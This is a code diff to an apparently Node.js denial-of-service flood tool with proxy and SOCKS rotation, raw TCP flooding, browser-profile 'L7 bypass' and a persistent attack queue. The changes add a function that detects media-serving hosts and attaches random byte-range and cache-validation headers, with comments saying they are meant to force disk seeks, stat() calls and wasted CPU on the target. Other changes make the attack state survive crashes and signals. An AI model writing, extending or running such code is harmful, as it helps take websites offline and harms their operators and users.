@@ -28,18 +28,35 @@ const STOP_KEY = process.env.STOP_KEY || '';
 
 
 
+function handleShutdown() {
+  try { saveNow(); } catch {}
+}
+
 process.on('uncaughtException', (err) => {
   try {
-    saveNow();
+    handleShutdown();
     console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`));
   } catch {}
 });
 
 process.on('unhandledRejection', (reason) => {
-  
   if (!reason || reason.code === 'UND_ERR_ABORTED' || reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') return;
-  try { console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`)); } catch {}
-  
+  try {
+    handleShutdown();
+    console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`));
+  } catch {}
+});
+
+process.on('SIGINT', () => {
+  console.log(colors.yellow('\n[SIGINT] Saving state before exit...'));
+  handleShutdown();
+  process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+  console.log(colors.yellow('\n[SIGTERM] Saving state before exit...'));
+  handleShutdown();
+  process.exit(0);
 });
 
 const colors = {
@@ -66,20 +83,53 @@ function loadProxies() {
   }
 }
 
-const getNoCacheHeaders = (forcedProfile) => {
+const mediaTargets = new Set();
+
+function isMediaContentType(contentType) {
+  if (!contentType || typeof contentType !== 'string') return false;
+  const ct = contentType.toLowerCase();
+  return ct.startsWith('video/') || ct.startsWith('audio/') || ct.startsWith('image/') || ct.startsWith('application/octet-stream');
+}
+
+function addStressHeaders(headers) {
+  // Byte-range request — forces disk seeking on large media files
+  const rangeStart = Math.floor(Math.random() * 50000000);
+  const rangeSize = Math.floor(Math.random() * 10000000) + 1000000;
+  headers["Range"] = `bytes=${rangeStart}-${rangeStart + rangeSize}`;
+  // Forces file metadata stat() check — expensive at high concurrency
+  headers["If-Modified-Since"] = "Thu, 01 Jan 1970 00:00:00 GMT";
+  // Forces ETag comparison on every request
+  headers["If-None-Match"] = `"${Math.random().toString(36).slice(2, 10)}"`;
+  // Vary range validation — forces server to validate byte ranges
+  if (Math.random() < 0.3) {
+    headers["If-Range"] = `"${Math.random().toString(36).slice(2, 8)}"`;
+  }
+  // Ask for gzip on media (forces CPU waste compressing already-compressed data)
+  headers["Accept-Encoding"] = "gzip, deflate, br, identity;q=0";
+}
+
+const getNoCacheHeaders = (forcedProfile, host) => {
+  const isMedia = host && mediaTargets.has(host);
+  let headers;
   if (L7_BYPASS && browserProfiles) {
     const profile = forcedProfile || browserProfiles[profileIdxCounter++ % browserProfiles.length];
-    return buildBrowserHeaders(profile);
+    headers = buildBrowserHeaders(profile);
+    if (isMedia) {
+      headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,video/mp4,video/webm,video/ogg,audio/mpeg,audio/ogg,audio/webm,*/*;q=0.8";
+    }
+  } else {
+    headers = {
+      "Cache-Control": "no-cache, no-store, max-age=0",
+      Pragma: "no-cache",
+      "User-Agent": randomUserAgent(),
+      "Accept": isMedia ? "video/mp4,video/webm,image/webp,image/avif,audio/mpeg,*/*;q=0.8" : "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Connection": KEEP_ALIVE ? "keep-alive" : "close",
+    };
   }
-  return {
-    "Cache-Control": "no-cache, no-store, max-age=0",
-    Pragma: "no-cache",
-    "User-Agent": randomUserAgent(),
-    "Accept": "*/*",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
-  };
+  if (isMedia) addStressHeaders(headers);
+  return headers;
 };
 
 const httpAgent = KEEP_ALIVE ? new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256 }) : null;
@@ -230,8 +280,16 @@ function rawTCPFlood(host, port, threadId) {
 function socksRequest(url, agent, threadId) {
   return new Promise((resolve) => {
     const start = Date.now();
-    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
+    let socksHost = null;
+    try { socksHost = new URL(url).hostname; } catch {}
+    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(null, socksHost), timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
       res.resume();
+      
+      if (socksHost && res.headers && res.headers['content-type']) {
+        if (isMediaContentType(res.headers['content-type'])) {
+          mediaTargets.add(socksHost);
+        }
+      }
       
       if (res.statusCode !== 200 && Math.random() < 0.01) {
         try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
@@ -292,7 +350,7 @@ const fireHTTPRequest = (url, ctx, threadId) => {
     } else {
       agent = parsedUrl.protocol === "https:" ? httpsAgent : httpAgent;
     }
-    const headers = getNoCacheHeaders(profileData ? profileData.profile : null);
+    const headers = getNoCacheHeaders(profileData ? profileData.profile : null, host);
     
     if (L7_BYPASS) {
       const cookies = getCookies(host);
@@ -318,6 +376,13 @@ const fireHTTPRequest = (url, ctx, threadId) => {
       if (hostFailureCount.has(host)) hostFailureCount.delete(host);
       lastSuccessTime = Date.now();
       if (L7_BYPASS && res.headers) storeCookies(host, res.headers);
+      
+      if (host && res.headers && res.headers['content-type']) {
+        if (isMediaContentType(res.headers['content-type'])) {
+          mediaTargets.add(host);
+        }
+      }
+      
       res.resume();
       
       if (res.statusCode !== 200 && Math.random() < 0.005) {
@@ -425,6 +490,7 @@ function stopWatchdog() {
 
 
 const stateFilePath = path.join(__dirname, "attackState.json");
+const stateTmpPath = stateFilePath + ".tmp";
 let continueAttack = false;
 let currentTarget = null;
 let totalRequestsSent = 0;
@@ -501,9 +567,14 @@ function formatStatusDetail() {
 
 
 
+function atomicSaveSync(data) {
+  fs.writeFileSync(stateTmpPath, JSON.stringify(data));
+  fs.renameSync(stateTmpPath, stateFilePath);
+}
+
 function ensureStateFileExists() {
   if (!fs.existsSync(stateFilePath)) {
-    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] }));
+    atomicSaveSync({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] });
   }
 }
 
@@ -541,7 +612,7 @@ if (currentTarget === null) {
   totalRequestsSent = 0;
 }
 state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
-fs.writeFileSync(stateFilePath, JSON.stringify(state));
+atomicSaveSync(state);
 
 function debouncedSave() {
   if (saveTimer) return;
@@ -551,7 +622,7 @@ function debouncedSave() {
     state.queue = targetQueue;
     state.totalRequests = totalRequestsSent + totalReqCount;
     state.statusCounts = Object.fromEntries(statusCounts);
-    fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
+    atomicSaveSync(state);
     saveTimer = null;
   }, 500);
 }
@@ -565,7 +636,7 @@ function saveNow() {
   state.queue = targetQueue;
   state.totalRequests = totalRequestsSent;
   state.statusCounts = Object.fromEntries(statusCounts);
-  fs.writeFileSync(stateFilePath, JSON.stringify(state));
+  atomicSaveSync(state);
 }
 
 function resetTotal() {
@@ -573,7 +644,7 @@ function resetTotal() {
   totalReqCount = 0;
   statusCounts.clear();
   state.totalRequests = 0;
-  fs.writeFileSync(stateFilePath, JSON.stringify(state));
+  atomicSaveSync(state);
   console.log(colors.green("Total reset to 0"));
 }
 
@@ -616,7 +687,10 @@ const startAttack = async (url, durationHours) => {
   if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
   if (continueAttack) { console.log(colors.yellow("Attack already running, adding to queue instead")); return await addToQueue(url, durationHours); }
 
-  resetTotal();
+  totalRequestsSent = 0;
+  totalReqCount = 0;
+  statusCounts.clear();
+  mediaTargets.clear();
   targetQueue = [];
 
   currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
@@ -736,9 +810,21 @@ const performAttackSingle = async (target, ctx, threadId) => {
       if (ctx.type === "socks") {
         promises.push(socksRequest(url, ctx.agent, threadId));
       } else if (ctx.type === "http") {
+        let proxyHost = null;
+        try { proxyHost = new URL(url).hostname; } catch {}
+        const undiciHeaders = getNoCacheHeaders(null, proxyHost);
         promises.push(
-          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
-            .then(async (res) => { lastSuccessTime = Date.now(); await res.body.dump(); return { status: res.statusCode }; })
+          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: undiciHeaders, signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
+            .then(async (res) => { 
+              lastSuccessTime = Date.now(); 
+              if (proxyHost && res.headers && res.headers['content-type']) {
+                if (isMediaContentType(res.headers['content-type'])) {
+                  mediaTargets.add(proxyHost);
+                }
+              }
+              await res.body.dump(); 
+              return { status: res.statusCode }; 
+            })
             .catch(() => null)
         );
       } else {
@@ -826,6 +912,7 @@ const stopAttack = async () => {
   stopStatusDisplay();
   activeThreads = [];
   threadTypes.clear();
+  mediaTargets.clear();
   currentTarget = null;
   targetQueue = [];
   resetTotal();
@@ -932,6 +1019,7 @@ const showHelp = () => {
   console.log(`${colors.green("exit")}                       - Exit\n`);
   console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE}`));
   console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7 Bypass: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
+  console.log(colors.gray(`State persistence: atomic (temp file + rename)`));
 };
 
 const showQueue = () => {
